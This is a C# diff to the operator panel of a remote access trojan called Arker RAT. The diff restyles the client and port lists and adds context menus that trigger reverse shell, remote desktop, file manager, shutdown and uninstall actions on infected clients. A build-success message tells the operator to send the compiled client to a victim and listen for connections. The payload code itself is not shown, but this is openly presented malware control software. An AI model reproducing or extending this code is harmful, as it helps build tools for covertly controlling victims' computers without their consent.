@@ -24,6 +24,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Reflection;
 using System.Resources;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
 
 namespace ArkerRatWpfVersion
 {
@@ -35,6 +36,20 @@ namespace ArkerRatWpfVersion
         public MainWindow()
         {
             InitializeComponent();
+
+            clientDataGrid.PreviewMouseRightButtonDown += OnPreviewMouseRightButtonDown;
+
+            clientDataGrid.PreviewMouseLeftButtonDown += DataGridRow_PreviewMouseLeft;
+
+            loadServers.PreviewMouseRightButtonDown += OnPreviewMouseRightButtonDown;
+            loadServers.PreviewMouseLeftButtonDown+= DataGridRow_PreviewMouseLeft;
+
+            clientDataGrid.IsTabStop = false;
+            loadServers.IsTabStop = false;
+
+            consoleLog.Document.Blocks.Clear();
+            consoleLog.IsReadOnly = true;
+            consoleLog.AppendText("Arker RAT logs:\n\n");
 
             Thread updateThread = new Thread(new ThreadStart(UpdateUI));
             updateThread.SetApartmentState(ApartmentState.STA);
@@ -63,23 +78,244 @@ namespace ArkerRatWpfVersion
                             iPInput.Text = address;
                         }));
                     }
-                    catch (Exception ex){}
+                    catch (Exception ex){ consoleLog.AppendText(ex.Message+ "\n");
+                    consoleLog.ScrollToEnd();
+                }
             });
             
         }
 
+        private void DataGridRow_PreviewMouseLeft(object sender, MouseButtonEventArgs e)
+        {
+            e.Handled = true;               
+        }
+
+        private void OnPreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            e.Handled = true;
+
+            DataGridRow row = FindVisualParent<DataGridRow>(e.OriginalSource as FrameworkElement);
+
+            if (row != null)
+            {
+
+                // Retrieve the corresponding DataItem
+                if(row.Item is DataItemClient)
+                {
+                    DataItemClient dataItem = (DataItemClient)row.Item;
+
+                    if (dataItem != null)
+                    {
+                        if (dataItem.ContextMenu != null)
+                            return;
+
+
+                        MenuItem reversShellButton = new MenuItem();
+                        reversShellButton.Header = "Reverse-shell";
+                        reversShellButton.Icon = new System.Windows.Controls.Image
+                        {
+                            Stretch = Stretch.Uniform,
+                            Source = TryFindResource("CmdImage") as BitmapImage
+                        };
+
+                        MenuItem fileManager = new MenuItem();
+                        fileManager.Header = "File-Manager";
+                        fileManager.Icon = new System.Windows.Controls.Image
+                        {
+                            Stretch = Stretch.Uniform,
+                            Source = TryFindResource("FileManagerImage") as BitmapImage
+                        };
+
+                        MenuItem unInstall = new MenuItem();
+                        unInstall.Header = "Uninstall client";
+                        unInstall.Icon = new System.Windows.Controls.Image
+                        {
+                            Stretch = Stretch.Uniform,
+                            Source = TryFindResource("RemoveImage") as BitmapImage
+                        };
+
+                        MenuItem disconnect = new MenuItem();
+                        disconnect.Header = "Disconnect client";
+                        disconnect.Icon = new System.Windows.Controls.Image
+                        {
+                            Stretch = Stretch.Uniform,
+                            Source = TryFindResource("RemoveImage") as BitmapImage
+                        };
+
+                        MenuItem remoteDesktop = new MenuItem();
+                        remoteDesktop.Header = "Remote-desktop";
+                        remoteDesktop.Icon = new System.Windows.Controls.Image
+                        {
+                            Stretch = Stretch.Uniform,
+                            Source = TryFindResource("RemoteDesktopImage") as BitmapImage
+                        };
+
+                        MenuItem shutDown = new MenuItem();
+                        shutDown.Header = "Shut down";
+                        shutDown.Icon = new System.Windows.Controls.Image
+                        {
+                            Stretch = Stretch.Uniform,
+                            Source = TryFindResource("ShutDownImage") as BitmapImage
+                        };
+
+                        MenuItem restart = new MenuItem();
+                        restart.Header = "Restart";
+                        restart.Icon = new System.Windows.Controls.Image
+                        {
+                            Stretch = Stretch.Uniform,
+                            Source = TryFindResource("RestartImage") as BitmapImage
+                        };
+
+                        MenuItem logOut = new MenuItem();
+                        logOut.Header = "Log out";
+                        logOut.Icon = new System.Windows.Controls.Image
+                        {
+                            Stretch = Stretch.Uniform,
+                            Source = TryFindResource("LogOutImage") as BitmapImage
+                        };
+
+                        MenuItem sleep = new MenuItem();
+                        sleep.Header = "Sleep";
+                        sleep.Icon = new System.Windows.Controls.Image
+                        {
+                            Stretch = Stretch.Uniform,
+                            Source = TryFindResource("SleepImage") as BitmapImage
+                        };
+
+                        dataItem.ContextMenu = new ContextMenu();
+                        dataItem.ContextMenu.Background = new SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 17, 20));
+                        dataItem.ContextMenu.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(153, 102, 255));
+
+                        // Tools
+                        dataItem.ContextMenu.Items.Add(reversShellButton);
+                        dataItem.ContextMenu.Items.Add(remoteDesktop);
+                        dataItem.ContextMenu.Items.Add(fileManager);
+
+                        // Disconnect
+                        dataItem.ContextMenu.Items.Add(unInstall);
+                        dataItem.ContextMenu.Items.Add(disconnect);
+                        dataItem.ContextMenu.Items.Add(shutDown);
+                        dataItem.ContextMenu.Items.Add(restart);
+                        dataItem.ContextMenu.Items.Add(logOut);
+                        dataItem.ContextMenu.Items.Add(sleep);
+
+                        dataItem.ContextMenu.Visibility = Visibility.Visible;
+                        dataItem.ContextMenu.IsOpen = true;
+
+                        for (int y = 0; y < ArkerRATServerMechanics.rATClients.Count; y++)
+                        {
+                            if (ArkerRATServerMechanics.rATClients[y].dataItem.Tag as string == dataItem.Tag as string)
+                            {
+                                reversShellButton.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartReverseShell);
+                                unInstall.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Uninstall);
+                                disconnect.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Disconnect);
+                                remoteDesktop.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartRemoteDesktop);
+                                fileManager.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartFileManager);
+
+                                shutDown.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].ShutDown);
+                                restart.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Restart);
+                                logOut.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].LogOut);
+                                sleep.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Sleep);
+
+
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    DataItemPort dataItem = (DataItemPort)row.Item;
+                    dataItem.ContextMenu = new ContextMenu();
+                    dataItem.ContextMenu.Tag = dataItem;
+
+                    dataItem.ContextMenu.Background = new SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 17, 20));
+                    dataItem.ContextMenu.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(153, 102, 255));
+
+                    if (ArkerRATServerMechanics.ports.Contains(Convert.ToInt32(dataItem.Tag)))
+                    {
+                        MenuItem closePort = new MenuItem();
+                        closePort.Header = "Close";
+                        closePort.Icon = new System.Windows.Controls.Image
+                        {
+                            Stretch = Stretch.Uniform,
+                            Source = TryFindResource("ShutDownImage") as BitmapImage
+                        };
+                        dataItem.ContextMenu.Items.Add(closePort);
+                        closePort.Click += new RoutedEventHandler(CloseServer);
+                    }
+                    else
+                    {
+                        MenuItem openPort = new MenuItem();
+                        openPort.Header = "Open";
+                        openPort.Icon = new System.Windows.Controls.Image
+                        {
+                            Stretch = Stretch.Uniform,
+                            Source = TryFindResource("SleepImage") as BitmapImage
+                        };
+                        dataItem.ContextMenu.Items.Add(openPort);
+                        openPort.Click += new RoutedEventHandler(OpenServer);
+                    }
+                    
+
+                    MenuItem deletePort = new MenuItem();
+                    deletePort.Header = "Delete";
+                    deletePort.Icon = new System.Windows.Controls.Image
+                    {
+                        Stretch = Stretch.Uniform,
+                        Source = TryFindResource("RemoveImage") as BitmapImage
+                    };
+
+                    dataItem.ContextMenu.Items.Add(deletePort);
+
+                    //closePort.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Sleep);
+                    //deletePort.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Sleep);
+
+
+                    dataItem.ContextMenu.Visibility = Visibility.Visible;
+                    dataItem.ContextMenu.IsOpen = true;
+
+                    deletePort.Click += new RoutedEventHandler(RemoveServer);
+                }
+            }
+        }
+        bool portOpen = false;
+
+
+        private static T FindVisualParent<T>(FrameworkElement element) where T : FrameworkElement
+        {
+            FrameworkElement parent = element;
+            while (parent != null)
+            {
+                if (parent is T typedParent)
+                    return typedParent;
+
+                parent = VisualTreeHelper.GetParent(parent) as FrameworkElement;
+            }
+
+            return null;
+        }
+
+        int oldCountPort = 0;
         int oldCount = 0;
         private void UpdateUI()
         {
             while(true)            
             {
+                if (ArkerRATServerMechanics.ports.Count != oldCountPort)
+                {
+                    oldCountPort = ArkerRATServerMechanics.ports.Count;
+                    Application.Current.Dispatcher.BeginInvoke(new Action(() =>
+                    {
+                        serverAmountLabel.Content = ArkerRATServerMechanics.ports.Count;
+                    }));
+                }
+                    
                 if (ArkerRATServerMechanics.rATClients.Count() != oldCount)
                 {
                     oldCount = ArkerRATServerMechanics.rATClients.Count();
                     Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                     {
                         clientAmountLabel.Content = ArkerRATServerMechanics.rATClients.Count();
-                        serverAmountLabel.Content = 0;
                     }));
                 }
 
@@ -196,149 +432,71 @@ namespace ArkerRatWpfVersion
         {
             MessageBox.Show("ArkerRAT has been compiled SUCCESSFULLY send it to a victim, and start listening for conections at the network tab. " +
                "All the available clients will be shown at the clients tab.");
+            consoleLog.AppendText("Client build has succeded!\n");
+            consoleLog.ScrollToEnd();
         }
 
         private async void Listener(object sender, RoutedEventArgs e)
         {   
             if (!ArkerRATServerMechanics.ports.Contains(Convert.ToInt32(portInput.Text)))
             {
-                Button serverButton = new Button();
-                serverButton.Width = 732;
-                serverButton.Height = 30;
-                System.Windows.Media.Color arkerGrey = System.Windows.Media.Color.FromRgb(18, 17, 20);
-                System.Windows.Media.Color arkerPurple = System.Windows.Media.Color.FromRgb(153, 102, 255);
-                serverButton.BorderBrush = new SolidColorBrush(arkerPurple);
-                serverButton.Foreground = new SolidColorBrush(arkerPurple);
-                serverButton.Background = new SolidColorBrush(arkerGrey);
-                serverButton.Content = portInput.Text;
-                serverButton.Click += new RoutedEventHandler(RemoveServer);
-                serverButton.Tag = Convert.ToInt32(portInput.Text);
-                loadServers.Items.Add(serverButton);
+                DataItemPort dataItemPort = new DataItemPort();
+                dataItemPort.Port = portInput.Text;
+                dataItemPort.Status = "Open";
+                dataItemPort.Tag = portInput.Text;
+                loadServers.Items.Add(dataItemPort);
                 ArkerRATServerMechanics.ports.Add(Convert.ToInt32(portInput.Text));
+                ArkerRATServerMechanics.StopListener();
                 ArkerRATServerMechanics.StartServer();
+                consoleLog.AppendText("Port:" + dataItemPort.Port + " Opened\n");
+                consoleLog.ScrollToEnd();
             }
+        }
+
+        private async void CloseServer(object sender, RoutedEventArgs e)
+        {
+            MenuItem item = (MenuItem)sender;
+            ContextMenu menu = (ContextMenu)item.Parent;
+            DataItemPort dataItemPort = (DataItemPort)menu.Tag;
+            ArkerRATServerMechanics.ports.Remove(Convert.ToInt32(dataItemPort.Tag));
+            ArkerRATServerMechanics.StopListener();
+            ArkerRATServerMechanics.StartServer();
+            loadServers.Items.Remove(dataItemPort);
+            dataItemPort.Status = "Close";
+            loadServers.Items.Add(dataItemPort);
+
+            consoleLog.AppendText("Port:"+dataItemPort.Port+ " Closed\n");
+            consoleLog.ScrollToEnd();
         }
 
         private async void RemoveServer(object sender, RoutedEventArgs e)
         {
-            Button button = (Button)sender;
-            ArkerRATServerMechanics.ports.Remove((int)button.Tag);
+
+            MenuItem item = (MenuItem)sender;
+            ContextMenu menu = (ContextMenu)item.Parent;
+            DataItemPort dataItemPort = (DataItemPort)menu.Tag;
+            ArkerRATServerMechanics.ports.Remove(Convert.ToInt32(dataItemPort.Tag));
             ArkerRATServerMechanics.StopListener();
             ArkerRATServerMechanics.StartServer();
-            loadServers.Items.Remove(button);
+            loadServers.Items.Remove(dataItemPort);
+            consoleLog.AppendText("Port:" + dataItemPort.Port + " Closed\n");
+            consoleLog.ScrollToEnd();
         }
 
-        public void CyperTools(Button clientButton)
+        private async void OpenServer(object sender, RoutedEventArgs e)
         {
-            MenuItem reversShellButton = new MenuItem();
-            reversShellButton.Header = "Reverse-shell";
-            reversShellButton.Icon = new System.Windows.Controls.Image
-            {
-                Stretch = Stretch.Uniform,
-                Source = TryFindResource("CmdImage") as BitmapImage
-            };
-
-            MenuItem fileManager = new MenuItem();
-            fileManager.Header = "File-Manager";
-            fileManager.Icon = new System.Windows.Controls.Image
-            {
-                Stretch = Stretch.Uniform,
-                Source = TryFindResource("FileManagerImage") as BitmapImage
-            };
-
-            MenuItem unInstall = new MenuItem();
-            unInstall.Header = "Uninstall client";
-            unInstall.Icon = new System.Windows.Controls.Image
-            {
-                Stretch = Stretch.Uniform,
-                Source = TryFindResource("RemoveImage") as BitmapImage
-            };
-
-            MenuItem disconnect = new MenuItem();
-            disconnect.Header = "Disconnect client";
-            disconnect.Icon = new System.Windows.Controls.Image
-            {
-                Stretch = Stretch.Uniform,
-                Source = TryFindResource("RemoveImage") as BitmapImage
-            };
-
-            MenuItem remoteDesktop = new MenuItem();
-            remoteDesktop.Header = "Remote-desktop";
-            remoteDesktop.Icon = new System.Windows.Controls.Image
-            {
-                Stretch = Stretch.Uniform,
-                Source = TryFindResource("RemoteDesktopImage") as BitmapImage
-            };
-
-            MenuItem shutDown = new MenuItem();
-            shutDown.Header = "Shut down";
-            shutDown.Icon = new System.Windows.Controls.Image
-            {
-                Stretch = Stretch.Uniform,
-                Source = TryFindResource("ShutDownImage") as BitmapImage
-            };
+            MenuItem item = (MenuItem)sender;
+            ContextMenu menu = (ContextMenu)item.Parent;
+            DataItemPort dataItemPort = (DataItemPort)menu.Tag;
             
-            MenuItem restart = new MenuItem();
-            restart.Header = "Restart";
-            restart.Icon = new System.Windows.Controls.Image
-            {
-                Stretch = Stretch.Uniform,
-                Source = TryFindResource("RestartImage") as BitmapImage
-            };
-
-            MenuItem logOut = new MenuItem();
-            logOut.Header = "Log out";
-            logOut.Icon = new System.Windows.Controls.Image
-            {
-                Stretch = Stretch.Uniform,
-                Source = TryFindResource("LogOutImage") as BitmapImage
-            };
-
-            MenuItem sleep = new MenuItem();
-            sleep.Header = "Sleep";
-            sleep.Icon = new System.Windows.Controls.Image
-            {
-                Stretch = Stretch.Uniform,
-                Source = TryFindResource("SleepImage") as BitmapImage
-            };
-
-            clientButton.ContextMenu = new ContextMenu();
-            clientButton.ContextMenu.Background = new SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 17, 20));
-            clientButton.ContextMenu.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(153, 102, 255));
-
-            // Tools
-            clientButton.ContextMenu.Items.Add(reversShellButton);
-            clientButton.ContextMenu.Items.Add(remoteDesktop);
-            clientButton.ContextMenu.Items.Add(fileManager);
-
-            // Disconnect
-            clientButton.ContextMenu.Items.Add(unInstall);
-            clientButton.ContextMenu.Items.Add(disconnect);
-            clientButton.ContextMenu.Items.Add(shutDown);
-            clientButton.ContextMenu.Items.Add(restart);
-            clientButton.ContextMenu.Items.Add(logOut);
-            clientButton.ContextMenu.Items.Add(sleep);
-
-            clientButton.ContextMenu.Visibility = Visibility.Visible;
-
-            for (int y = 0; y < ArkerRATServerMechanics.rATClients.Count; y++)
-            {
-                if (ArkerRATServerMechanics.rATClients[y].clientButton.Tag as string == clientButton.Tag as string)
-                {
-                    reversShellButton.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartReverseShell);
-                    unInstall.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Uninstall);
-                    disconnect.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Disconnect);
-                    remoteDesktop.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartRemoteDesktop);
-                    fileManager.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartFileManager);
-
-                    shutDown.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].ShutDown);
-                    restart.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Restart);
-                    logOut.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].LogOut);
-                    sleep.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Sleep);
-
-
-                }
-            }
+            ArkerRATServerMechanics.ports.Add(Convert.ToInt32(dataItemPort.Tag));
+            ArkerRATServerMechanics.StopListener();
+            ArkerRATServerMechanics.StartServer();
+            loadServers.Items.Remove(dataItemPort);
+            dataItemPort.Status = "Open";
+            loadServers.Items.Add(dataItemPort);
+            consoleLog.AppendText("Port:" + dataItemPort.Port + " Opened\n");
+            consoleLog.ScrollToEnd();
         }
 
 
@@ -357,23 +515,21 @@ namespace ArkerRatWpfVersion
         public void LoadCLients()
         {
 
-            loadClients.Items.Clear();
+            clientDataGrid.Items.Clear();
             for (int y = 0; y < ArkerRATServerMechanics.rATClients.Count; y++)
             {
-                ArkerRATServerMechanics.rATClients[y].clientButton.Width = 732;
-                ArkerRATServerMechanics.rATClients[y].clientButton.Height = 30;
-                System.Windows.Media.Color arkerGrey = System.Windows.Media.Color.FromRgb(18, 17, 20);
-                System.Windows.Media.Color arkerPurple = System.Windows.Media.Color.FromRgb(153, 102, 255);
-                ArkerRATServerMechanics.rATClients[y].clientButton.BorderBrush = new SolidColorBrush(arkerPurple);
-                ArkerRATServerMechanics.rATClients[y].clientButton.Foreground = new SolidColorBrush(arkerPurple);
-                ArkerRATServerMechanics.rATClients[y].clientButton.Background = new SolidColorBrush(arkerGrey);
-                ArkerRATServerMechanics.rATClients[y].clientButton.Content = ArkerRATServerMechanics.rATClients[y].clientInfo + "\t" + ArkerRATServerMechanics.rATClients[y].ms + "ms";
+                ArkerRATServerMechanics.rATClients[y].dataItem = new DataItemClient
+                {
+                    ClientName = ArkerRATServerMechanics.rATClients[y].clientInfo[0],
+                    OS = ArkerRATServerMechanics.rATClients[y].clientInfo[1],
+                    IPAddress = ArkerRATServerMechanics.rATClients[y].clientInfo[2],
+                    MS = Convert.ToString(ArkerRATServerMechanics.rATClients[y].ms),
+                        Tag = ArkerRATServerMechanics.rATClients[y].dataItem.Tag,
+                        ContextMenu =null
 
+                    };
                
-                    loadClients.Items.Add(ArkerRATServerMechanics.rATClients[y].clientButton);
-                
-                
-                CyperTools(ArkerRATServerMechanics.rATClients[y].clientButton);
+                    clientDataGrid.Items.Add(ArkerRATServerMechanics.rATClients[y].dataItem);
             }
         }
     }
